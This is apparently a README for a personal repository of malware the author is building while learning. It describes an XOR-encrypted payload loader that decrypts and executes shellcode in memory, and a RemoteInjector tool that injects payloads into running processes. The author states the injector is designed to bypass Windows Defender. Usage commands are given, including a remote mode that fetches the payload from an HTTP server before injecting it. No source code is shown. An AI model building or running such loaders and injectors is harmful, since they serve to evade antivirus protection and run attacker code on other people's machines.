# Malware

This is a repository to just post and store the malware development I'm doing and learning.

## XOR Encryption (Malware)
Encrypts a .bin (payload) file and decrypts it in memory before executing it.

Usage
```
.\Malware.exe '[KEY]' [file.bin]
```

## RemoteInjector
Reads a payload in 64-bit format from a .bin file and injects it into a remote running process. The payload is XOR encrypted before being injected and later decrypted in memory. This method is designed to bypass Windows Defender when the payload file is fetched from an external server via HTTP.

Note: The original code is intended for downloading the .bin file using HTTP. For HTTPS support, please refer to the additional instructions within the source code.

### Usage
#### Local Mode
To use a local .bin file:
```
.\RemoteInjector.exe Local [Payload File] [Process PID] [XOR Encoding Key]
```

#### Remote Mode
To use a remote .bin file, modify the IP and bin file parameters in the source code accordingly if needed. The current code assumes that you'll be using port 80 as the HTTP server.
```
.\RemoteInjector.exe Remote [Remote server IP] [File Name] [Process PID] [XOR Encoding Key]
```
